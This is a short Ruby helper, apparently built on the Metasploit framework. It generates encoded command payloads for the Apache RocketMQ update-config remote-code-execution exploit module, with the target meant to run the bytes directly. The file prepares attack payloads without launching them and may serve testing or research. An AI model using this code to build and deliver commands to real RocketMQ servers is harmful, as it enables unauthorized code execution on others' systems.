# frozen_string_literal: true

require 'base64'
require 'digest'

# Generate normally against the exploit's real constraints without calling its
# setup, network methods or exploit. The target executes these bytes directly.
module RocketmqCommandControl
  def self.generate(framework, command)
    owner = framework.modules.create('exploit/multi/http/apache_rocketmq_update_config')
    payload = framework.payloads.create('cmd/unix/generic')
    payload.datastore['CMD'] = command
    owner.datastore['CMD'] = command
    owner.datastore['PAYLOAD'] = 'cmd/unix/generic'
    bytes = owner.generate_payload(payload).encoded
    { command_base64: Base64.strict_encode64(bytes), sha256: Digest::SHA256.hexdigest(bytes), badchars: owner.payload_badchars.bytes }
  end
end
